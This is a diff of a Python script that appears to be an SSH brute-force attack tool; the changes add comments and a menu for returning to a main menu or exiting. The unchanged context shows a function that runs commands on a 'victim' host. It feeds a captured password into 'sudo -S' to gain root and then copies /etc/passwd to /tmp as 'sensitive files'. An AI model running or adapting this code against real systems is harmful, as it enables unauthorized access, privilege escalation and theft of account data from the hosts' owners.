@@ -34,11 +34,13 @@ def execute_commands_on_victim(client, password):
         network_info = stdout.read().decode()
         print(f"Network Info:\n{network_info}")
 
+        # Attempt to gain root access
         print("\n[+] Attempting to gain root access...")
 
         if 'root' in current_user:
             print("[+] Already running as root.")
         else:
+            # Send password to sudo and attempt to become root
             stdin, stdout, stderr = client.exec_command('sudo -S -p "" echo "Root access granted"')
             stdin.write(password + '\n')
             stdin.flush()
@@ -46,9 +48,10 @@ def execute_commands_on_victim(client, password):
 
             if "Root access granted" in sudo_result:
                 print("[+] Root access granted.")
+                # Once root, run commands as needed
                 print("\n[+] Copying sensitive files as root...")
                 stdin, stdout, stderr = client.exec_command('sudo cp /etc/passwd /tmp/passwd_copy')
-                stdout.read()  # Ensure the command runs
+                stdout.read()  # To ensure the command runs
                 print("[+] /etc/passwd copied to /tmp/passwd_copy")
             else:
                 print("[!] Root access denied or incorrect password for sudo.")
@@ -96,6 +99,18 @@ def main():
 
     print("Common Brute Force Attack Completed.")
     time.sleep(2)  # Adding delay to observe the output
+    end_or_return()  # Call the function to ask the user what to do next
+
+def end_or_return():
+    choice = input("\n[1] Return to Main Menu\n[0] Exit\nSelect an option: ")
+    if choice == '1':
+        from main import main_menu  # Import the main_menu function from main.py
+        main_menu()
+    elif choice == '0':
+        sys.exit()
+    else:
+        print("[!] Invalid selection.")
+        end_or_return()
 
 if __name__ == "__main__":
     main()
